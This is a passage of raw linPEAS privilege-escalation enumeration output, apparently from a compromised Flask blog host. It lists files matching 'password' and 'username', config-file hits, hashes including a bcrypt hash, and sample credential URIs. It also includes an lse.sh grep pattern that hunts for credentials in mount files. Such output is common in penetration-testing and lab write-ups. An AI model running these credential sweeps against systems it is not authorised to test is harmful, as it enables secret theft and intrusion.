+/home/web/blog/flaskblog/templates/login.html:                        {{ form.password(class="form-control form-control-lg is-invalid") }}
+/home/web/blog/flaskblog/templates/login.html:                    {{ form.password.label(class="form-control-label") }}
+/home/web/blog/flaskblog/templates/register.html:                        {{ form.confirm_password(class="form-control form-control-lg") }}
+/home/web/blog/flaskblog/templates/register.html:                        {{ form.confirm_password(class="form-control form-control-lg is-invalid") }}
+/home/web/blog/flaskblog/templates/register.html:                    {{ form.confirm_password.label(class="form-control-label") }}
+/home/web/blog/flaskblog/templates/register.html:                        {{ form.password(class="form-control form-control-lg") }}
+/home/web/blog/flaskblog/templates/register.html:                        {{ form.password(class="form-control form-control-lg is-invalid") }}
+/home/web/blog/flaskblog/templates/register.html:                    {{ form.password.label(class="form-control-label") }}
+/home/web/blog/flaskblog/templates/reset_token.html:                        {{ form.confirm_password(class="form-control form-control-lg") }}
+/home/web/blog/flaskblog/templates/reset_token.html:                    {{ form.confirm_password.label(class="form-control-label") }}
+/home/web/blog/flaskblog/templates/reset_token.html:                        {{ form.password(class="form-control form-control-lg") }}
+/home/web/blog/flaskblog/templates/reset_token.html:                        {{ form.password(class="form-control form-control-lg is-invalid") }}
+/home/web/blog/flaskblog/templates/reset_token.html:                    {{ form.password.label(class="form-control-label") }}
+/home/web/blog/flaskblog/users/forms.py:    confirm_password = PasswordField('Confirm Password',
+/home/web/blog/flaskblog/users/forms.py:    password = PasswordField('Password', validators=[DataRequired()])
+/home/web/blog/flaskblog/users/routes.py:        hashed_password = bcrypt.generate_password_hash(form.password.data).decode('utf-8')
+/home/web/blog/flaskblog/users/routes.py:    return render_template('reset_request.html', title='Reset Password', form=form)
+/home/web/blog/flaskblog/users/routes.py:    return render_template('reset_token.html', title='Reset Password', form=form)
+/home/web/blog/flaskblog/users/routes.py:        user.password = hashed_password
+/home/web/blog/flaskblog/users/routes.py:@users.route("/reset_password", methods=['GET', 'POST'])
+/home/web/blog/flaskblog/users/routes.py:@users.route("/reset_password/<token>", methods=['GET', 'POST'])
+/home/web/blog/flaskblog/users/routes.py:        user = User(username=form.username.data, email=form.email.data, password=hashed_password)
+/home/web/.local/lib/python3.8/site-packages/click/decorators.py:        @click.option('--password', prompt=True, confirmation_prompt=True,
+/home/web/.local/lib/python3.8/site-packages/flask_bcrypt.py:def generate_password_hash(password, rounds=None):
+/home/web/.local/lib/python3.8/site-packages/flask_bcrypt.py:    def generate_password_hash(self, password, rounds=None):
+/home/web/.local/lib/python3.8/site-packages/flask_bcrypt.py:        :param password: The password to be hashed.
+/home/web/.local/lib/python3.8/site-packages/flask_bcrypt.py:    :param password: The password to be hashed.
+/home/web/.local/lib/python3.8/site-packages/flask_bcrypt.py:        :param password: The password to compare.
+/home/web/.local/lib/python3.8/site-packages/flask_bcrypt.py:    :param password: The password to compare.
+/home/web/.local/lib/python3.8/site-packages/flask_bcrypt.py:            password = bytes(password, 'utf-8')
+/home/web/.local/lib/python3.8/site-packages/flask_bcrypt.py:        password = 'hunter2'
+/home/web/.local/lib/python3.8/site-packages/flask_bcrypt.py:            password = password.encode('utf-8')
+/home/web/.local/lib/python3.8/site-packages/flask_mail.py:        self.password = password
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/connectors/mxodbc.py:            connect(dsn, user='', password='',
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/connectors/pyodbc.py:                connectors.append("PWD=%s" % keys.pop("password", ""))
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mssql/pyodbc.py:    dsn=mydsn;UID=user;PWD=pass
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mysql/base.py:  table.select(table.c.password==func.md5('plaintext'))
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mysql/mysqldb.py:            database="db", username="user", password="passwd"
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mysql/oursql.py:            database="db", username="user", password="passwd"
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mysql/pyodbc.py:        'PWD=(whatever);'
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/oracle/cx_oracle.py:            opts["password"] = url.password
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/oracle/provision.py:    url.password = "xe"
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/__init__.py:    ``dialect[+driver]://user:password@host/dbname[?key=value..]``, where
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/url.py:            and self.password == other.password
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/url.py:            components["password"] = _rfc_1738_unquote(components["password"])
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/url.py:    def __to_string__(self, hide_password=True):
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/url.py:    :param password: database password.
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/url.py:        password=None,
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/url.py:        return self.__to_string__(hide_password=False)
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/url.py:        self.password_original = password
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/sql/schema.py:                    spwd = item._set_parent_with_dispatch
+/home/web/.local/lib/python3.8/site-packages/werkzeug/http.py:                "password": to_unicode(password, _basic_auth_charset),
+/home/web/.local/lib/python3.8/site-packages/werkzeug/http.py:            username, password = base64.b64decode(auth_info).split(b":", 1)
+/home/web/.local/lib/python3.8/site-packages/werkzeug/security.py:def generate_password_hash(password, method="pbkdf2:sha256", salt_length=8):
+/home/web/.local/lib/python3.8/site-packages/werkzeug/security.py:    :param password: the password to hash.
+/home/web/.local/lib/python3.8/site-packages/werkzeug/security.py:    :param password: the plaintext password to compare against the hash.
+/home/web/.local/lib/python3.8/site-packages/werkzeug/security.py:        password = password.encode("utf-8")
+/home/web/.local/lib/python3.8/site-packages/werkzeug/security.py:        rv = pbkdf2_hex(password, salt, iterations, hashfunc=method)
+/home/web/.local/lib/python3.8/site-packages/werkzeug/serving.py:    def load_cert_chain(self, certfile, keyfile=None, password=None):
+/home/web/.local/lib/python3.8/site-packages/werkzeug/serving.py:        self._password = None
+/home/web/.local/lib/python3.8/site-packages/werkzeug/serving.py:        self._password = password
+/home/web/.local/lib/python3.8/site-packages/werkzeug/urls.py:                    url_quote(self.raw_password or "", "utf-8", "strict", "/:%"),
+/home/web/.local/lib/python3.8/site-packages/werkzeug/urls.py:                    _url_unquote_legacy(self.raw_password or "", "/:%@"),
+/tmp/linpeas.sh:    echo "  You can login as $USER using password: $PASSWORDTRY" | sed -E "s,.*,${C}[1;31;103m&${C}[0m,"
+/tmp/linpeas.sh:  FIND_PASSWORD_RELEVANT_NAMES=$(prep_to_find "$PASSWORD_RELEVANT_NAMES")
+/tmp/linpeas.sh:PASSWORD=""
+/tmp/linpeas.sh:  PASSWORD_RELEVANT_NAMES="*password* *credential* creds*"
+
+[+] Finding possible password variables inside key folders (limit 70)
+/home/web/.local/lib/python3.8/site-packages/click/utils.py:def get_app_dir(app_name, roaming=True, force_posix=False):
+/home/web/.local/lib/python3.8/site-packages/click/utils.py:    :param app_name: the application name.  This should be properly capitalized
+/home/web/.local/lib/python3.8/site-packages/flask/cli.py:                    '"{app_name}".'.format(e=e, app_name=app_name)
+/home/web/.local/lib/python3.8/site-packages/flask/cli.py:def locate_app(script_info, module_name, app_name, raise_if_not_found=True):
+/home/web/.local/lib/python3.8/site-packages/flask/cli.py:                    e=e, app_name=app_name, module=module.__name__
+/home/web/.local/lib/python3.8/site-packages/flask/cli.py:        '"{module}:{app_name}".'.format(module=module.__name__, app_name=app_name)
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/firebird/base.py:                alias_name = (
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/sql/compiler.py:                alias_name = alias.name
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/sql/compiler.py:                alias_name = self._truncated_identifier("alias", alias.name)
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/sql/compiler.py:                cte_pre_alias_name = cte._cte_alias.name
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/sql/compiler.py:                cte_pre_alias_name = None
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/sql/compiler.py:                    cte_pre_alias_name = self._truncated_identifier(
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/testing/profiling.py:        dbapi_key = config.db.name + "_" + config.db.driver
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/testing/profiling.py:            dbapi_key += "_file"
+
+[+] Finding possible password in config files
+ /etc/nsswitch.conf
+passwd:         files systemd
+ /etc/sysctl.d/10-ptrace.conf
+credentials that exist in memory (re-using existing SSH connections,
+ /etc/adduser.conf
+passwd
+ /etc/exim.conf
+password authentication. This kind
+password protected). You can put
+password
+passwords are verified.
+credentials in one lump, containing an authorization ID (which we do not
+password. The latter two appear as
+password. In a real configuration you would typically
+password are $auth1 and $auth2. Apart from that you can use the same
+Password:
+ /etc/apache2/apache2.conf
+passwd files from being
+ /etc/security/pwquality.conf
+password quality limits
+password that must not be present in the
+password.
+password (plus one if
+password. If less than 0
+password.
+password.
+password.
+password.
+password.
+password.
+password.
+password (digits, uppercase, lowercase, others).
+password.
+password.
+passwd entry GECOS string of the user.
+password is rejected if it fails the check and the value is not 0.
+password.
+password quality for users that are not present in the
+passwd file.
+ /etc/debconf.conf
+passwords.
+password
+passwords.
+passwords
+password
+passwords.dat
+passwords and one for everything else.
+passwords
+password is really
+Passwd: secret
+
+[+] Finding 'username' string inside key folders (limit 70)
+/home/web/blog/flaskblog/config.py:    MAIL_USERNAME = "doctor"
+/home/web/blog/flaskblog/models.py:    username = db.Column(db.String(20), unique=True, nullable=False)
+/home/web/blog/flaskblog/templates/account.html:                        {{ form.username(class="form-control form-control-lg") }}
+/home/web/blog/flaskblog/templates/account.html:                        {{ form.username(class="form-control form-control-lg is-invalid") }}
+/home/web/blog/flaskblog/templates/account.html:                    {{ form.username.label(class="form-control-label") }}
+/home/web/blog/flaskblog/templates/register.html:                        {{ form.username(class="form-control form-control-lg") }}
+/home/web/blog/flaskblog/templates/register.html:                        {{ form.username(class="form-control form-control-lg is-invalid") }}
+/home/web/blog/flaskblog/templates/register.html:                    {{ form.username.label(class="form-control-label") }}
+/home/web/blog/flaskblog/users/forms.py:        if username.data != current_user.username:
+/home/web/blog/flaskblog/users/forms.py:    username = StringField('Username',
+/home/web/blog/flaskblog/users/forms.py:            user = User.query.filter_by(username=username.data).first()
+/home/web/blog/flaskblog/users/forms.py:        user = User.query.filter_by(username=username.data).first()
+/home/web/blog/flaskblog/users/routes.py:        current_user.username = form.username.data
+/home/web/blog/flaskblog/users/routes.py:        form.username.data = current_user.username
+/home/web/blog/flaskblog/users/routes.py:    user = User.query.filter_by(username=username).first_or_404()
+/home/web/blog/flaskblog/users/routes.py:        user = User(username=form.username.data, email=form.email.data, password=hashed_password)
+/home/web/.local/lib/python3.8/site-packages/flask/ctx.py:            def __init__(self, username, remote_addr=None):
+/home/web/.local/lib/python3.8/site-packages/flask/ctx.py:                self.username = username
+/home/web/.local/lib/python3.8/site-packages/flask/json/__init__.py:            return jsonify(username=g.user.username,
+/home/web/.local/lib/python3.8/site-packages/flask/json/__init__.py:            "username": "admin",
+/home/web/.local/lib/python3.8/site-packages/flask_mail.py:        self.username = username
+/home/web/.local/lib/python3.8/site-packages/flask_sqlalchemy/__init__.py:            username = db.Column(db.String(80), unique=True)
+/home/web/.local/lib/python3.8/site-packages/jinja2/filters.py:        {{ users|map(attribute="username", default="Anonymous")|join(", ") }}
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/connectors/mxodbc.py:        opts = url.translate_connect_args(username="user")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/connectors/pyodbc.py:        opts = url.translate_connect_args(username="user")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/firebird/fdb.py:        opts = url.translate_connect_args(username="user")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/firebird/kinterbasdb.py:        opts = url.translate_connect_args(username="user")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mssql/mxodbc.py:    :connectstring: mssql+mxodbc://<username>:<password>@<dsnname>
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mssql/pymssql.py:        opts = url.translate_connect_args(username="user")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mssql/pyodbc.py:    :connectstring: mssql+pyodbc://<username>:<password>@<dsnname>
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mysql/mysqlconnector.py:        opts = url.translate_connect_args(username="user")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mysql/mysqldb.py:            database="db", username="user", password="passwd"
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mysql/oursql.py:            database="db", username="user", password="passwd"
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mysql/pyodbc.py:    :connectstring: mysql+pyodbc://<username>:<password>@<dsnname>
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/oracle/provision.py:            "from v$session where username=u.username)"
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/oracle/provision.py:    url.username = ident
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/postgresql/pg8000.py:        opts = url.translate_connect_args(username="user")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/postgresql/psycopg2.py:        opts = url.translate_connect_args(username="user")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/postgresql/pygresql.py:        opts = url.translate_connect_args(username="user")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/postgresql/pypostgresql.py:        opts = url.translate_connect_args(username="user")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/sqlite/pysqlcipher.py:            username=url.username,
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/sybase/mxodbc.py:    :connectstring: sybase+mxodbc://<username>:<password>@<dsnname>
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/url.py:            and self.username == other.username
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/url.py:            components["username"] = _rfc_1738_unquote(components["username"])
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/url.py:    :param username: The user name.
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/url.py:                (?P<username>[^:/]*)
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/url.py:        self.username = username
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/url.py:        username=None,
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/sql/elements.py:            result = connection.execute(stmt, username='wendy')
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/sql/elements.py:                stmt, [{"username": "wendy", "fullname": "Wendy Smith"},
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/sql/elements.py:                       {"username": "jack", "fullname": "Jack Jones"},
+/home/web/.local/lib/python3.8/site-packages/werkzeug/debug/__init__.py:        username = getpass.getuser()
+/home/web/.local/lib/python3.8/site-packages/werkzeug/debug/__init__.py:        username = None
+/home/web/.local/lib/python3.8/site-packages/werkzeug/http.py:            username, password = base64.b64decode(auth_info).split(b":", 1)
+/home/web/.local/lib/python3.8/site-packages/werkzeug/http.py:                "username": to_unicode(username, _basic_auth_charset),
+/home/web/.local/lib/python3.8/site-packages/werkzeug/routing.py:                Rule('/stats', subdomain='<username>', endpoint='user/stats')
+/home/web/.local/lib/python3.8/site-packages/werkzeug/routing.py:                Rule('/', subdomain='<username>', endpoint='user/homepage'),
+/home/web/.local/lib/python3.8/site-packages/werkzeug/urls.py:                    url_quote(self.raw_username or "", "utf-8", "strict", "/:%"),
+/home/web/.local/lib/python3.8/site-packages/werkzeug/urls.py:                    _url_unquote_legacy(self.raw_username or "", "/:%@"),
+/tmp/lse.sh:    'grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab'
+
+[+] Searching specific hashes inside files - less false positives (limit 70)
+/tmp/linpeas.txt:$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
+
+[+] Searching md5/sha1/sha256/sha512 hashes inside files (limit 50)
+/etc/PackageKit/Vendor.conf:=f1e370ea7563ed5e654c10450364ff24
+/etc/grub.d/05_debian_theme:648ee65dd0c157a69b019a5372cbcfea4fc754a5 
+/etc/machine-id:62307f5876ce4bdeb1a4be33bebfb978
+/etc/X11/xinit/xinputrc: d57688c8151277a0c25d15aa0523da6b 
+/etc/popularity-contest.conf:"51aca6db7c5b4491a938c434c0a5f6cd"
+/var/backups/dpkg.status.0: 06247d62052029ead7d9ec1ef9457f42
+/tmp/linpeas.txt:/62307f5876ce4bdeb1a4be33bebfb978/
+
+[+] Finding URIs with user:password@host inside key folders
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mssql/base.py:        eng = create_engine("mssql+pymssql://user:pass@host/db",
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mssql/base.py:        "mssql+pyodbc://scott:tiger@ms_2008",
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mssql/mxodbc.py:    :connectstring: mssql+mxodbc://<username>:<password>@<dsnname>
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mssql/pyodbc.py:    :connectstring: mssql+pyodbc://<username>:<password>@<dsnname>
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mssql/pyodbc.py:    engine = create_engine("mssql+pyodbc://scott:tiger@some_dsn")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mysql/base.py:    e = create_engine("mysql://scott:tiger@localhost/test", echo=True)
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mysql/base.py:        "mysql+pymysql://scott:tiger@localhost/test?charset=utf8mb4")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mysql/base.py:                    "mysql://scott:tiger@localhost/test",
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/mysql/pyodbc.py:    :connectstring: mysql+pyodbc://<username>:<password>@<dsnname>
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/oracle/base.py:      engine = create_engine("oracle+cx_oracle://s:t@dsn")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/oracle/base.py:    engine = create_engine("oracle://scott:tiger@dsn",
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/oracle/base.py:        "oracle+cx_oracle://scott:tiger@oracle122",
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/oracle/base.py:      "oracle://scott:tiger@xe",
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/oracle/cx_oracle.py:        "oracle+cx_oracle://user:pass@dsn",
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/oracle/zxjdbc.py:    :connectstring: oracle+zxjdbc://user:pass@host/dbname
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/postgresql/base.py:        "postgresql+pg8000://scott:tiger@localhost/test",
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/postgresql/psycopg2.py:        "postgresql+psycopg2://scott:tiger@host/dbname",
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/postgresql/psycopg2.py:        "postgresql://user:pass@host/dbname",
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/postgresql/zxjdbc.py:    :connectstring: postgresql+zxjdbc://scott:tiger@localhost/db
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/sqlite/pysqlite.py:    driver://user:pass@host/database
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/dialects/sybase/mxodbc.py:    :connectstring: sybase+mxodbc://<username>:<password>@<dsnname>
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/base.py:        engine = create_engine("postgresql://scott:tiger@localhost/test")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/__init__.py:    ``dialect[+driver]://user:password@host/dbname[?key=value..]``, where
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/__init__.py:        engine = create_engine("mysql://scott:tiger@hostname/dbname",
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/__init__.py:        engine = create_engine("postgresql://scott:tiger@localhost/test")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/interfaces.py:          "mysql+pymysql://scott:tiger@localhost/"
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/interfaces.py:          "mysql+pymysql://scott:tiger@localhost/test",
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/engine/interfaces.py:          "mysql+pymysql://scott:tiger@localhost/test?plugin=myplugin")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/events.py:        engine = create_engine("postgresql://scott:tiger@localhost/test")
+/home/web/.local/lib/python3.8/site-packages/sqlalchemy/events.py:        engine = create_engine('postgresql://scott:tiger@localhost/test')
